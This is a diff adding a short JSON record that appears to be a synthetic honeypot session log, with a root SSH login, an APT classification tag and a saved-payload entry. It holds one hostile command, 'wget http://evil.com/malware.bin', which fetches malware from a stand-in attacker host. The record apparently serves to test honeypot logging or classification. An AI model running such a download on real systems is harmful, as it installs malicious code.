@@ -1,0 +1,29 @@
+{
+  "session_id": "S-1767939702",
+  "src_ip": "203.0.113.42",
+  "src_port": 54321,
+  "start_ts": 1767939702.9629545,
+  "instance": "honeypot-primary",
+  "events": [
+    {
+      "ts": 1767939702.9629545,
+      "text": "SSH-2.0-OpenSSH_7.4"
+    },
+    {
+      "ts": 1767939702.9629545,
+      "text": "root@192.168.1.1"
+    },
+    {
+      "ts": 1767939702.9629545,
+      "text": "wget http://evil.com/malware.bin"
+    },
+    {
+      "ts": 1767939702.9629545,
+      "text": "[CLASS]=APT|0.95|ENG=HIGH"
+    },
+    {
+      "ts": 1767939702.9629545,
+      "text": "[PAYLOAD_SAVED]={'file': 'malware.bin', 'sha256': 'abc123...', 'size': 2048}"
+    }
+  ]
+}
